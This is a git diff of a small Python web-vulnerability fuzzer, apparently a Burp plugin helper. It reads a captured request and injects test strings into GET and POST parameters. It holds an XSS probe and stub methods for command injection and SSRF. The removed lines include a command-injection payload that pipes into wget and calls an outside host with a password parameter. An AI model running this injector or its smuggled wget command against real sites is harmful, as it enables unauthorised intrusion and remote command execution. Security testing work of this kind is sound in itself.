@@ -11,22 +11,13 @@ Created on 2018��4��18��
 '''
 import json,re,requests
 
-class test_vul:
+class test:
     def __init__(self):
         '''burp_plugin'''
-    def start(self,payload):
-        vul_payload=payload
-        f = open('tmp.json', 'r', encoding='utf-8')
+        f = open('E:/hack/burp_lib/tmp.json', 'r', encoding='utf-8')
         test=re.sub('\'','\"',f.read())
-        data=json.loads(test)
-        print(data)
-        '''
-        if self.data['body']=='':
-            #urllist=self.data['url'].split('?')
-            self.get_data(self.vul_payload)
-        else:
-            self.post_data(self.vul_payload)
-        '''
+        self.data=json.loads(test)
+        #print(self.data)
         f.close()
     def get_data(self,payload):
         urllist=self.data['url'].split('?')
@@ -39,7 +30,7 @@ class test_vul:
             params[i]= '='.join(j)
             params= '&'.join(params)
             str=urllist[0] + '?' + params
-            self.attack_get(str)
+            self.method_get(str)
     def post_data(self,payload):
         try:
             urllist=self.data['url'].split('?')
@@ -52,7 +43,7 @@ class test_vul:
                 params[i]= '='.join(j)
                 params= '&'.join(params)
                 str=urllist[0] + '?' + params
-                self.attack_post(str,self.data['body'])
+                self.method_post(str,self.data['body'])
         except:
             pass
         param_list = self.data['body'].split('&')
@@ -63,7 +54,7 @@ class test_vul:
             params[i]= '='.join(j)
             params= '&'.join(params)
             #str=urllist[0] + '?' + params
-            self.attack_post(self.data['url'],params)
+            self.method_post(self.data['url'],params)
         
     def method_post(self,url,data):
         #print(url)
@@ -80,26 +71,38 @@ class test_vul:
             return r.text
         except:
             pass
+    def start(self):
+        print(self.data)
+        '''if self.data['body']=='':
+            #urllist=self.data['url'].split('?')
+            self.get_data(self.vul_payload)
+        else:
+            self.post_data(self.vul_payload)'''
     def xss_injection(self):
         '''
         :payload xss测试参数
         '''
-        print(payload)
-    def cmd_injection(self,payload):
+        payload=['<\'\"xssguimaizi>']
+        print(self.data)
+        if self.data['body']=='':
+            #urllist=self.data['url'].split('?')
+            self.get_data(payload[0])
+        else:
+            self.post_data(payload[0])
+    def cmd_injection(self):
         '''
         :payload 命令注入测试参数
         '''
+        payload=[]
         print(payload)
-    def ssrf_fuzz(self,payload):
+    def ssrf_fuzz(self):
         '''
         :payload ssrf测试参数
         '''
+        payload=[]
         print(payload)
         
         
 if '__main__' == __name__:
-    item=test_vul()
-    payload=['<\'\"xssguimaizi>','|wget http://www.guimaizi.com/getdata/save_data.php?pwd=k40seKJp']
-    for i in payload:
-        item.start(i)
-    #item.attack_post('http://192.168.0.136/test_vul.php?aasdas=dsadas&xss=aa&13dsada=dsa','post_vul=dasxsssda')
+    item=test()
+    item.start()
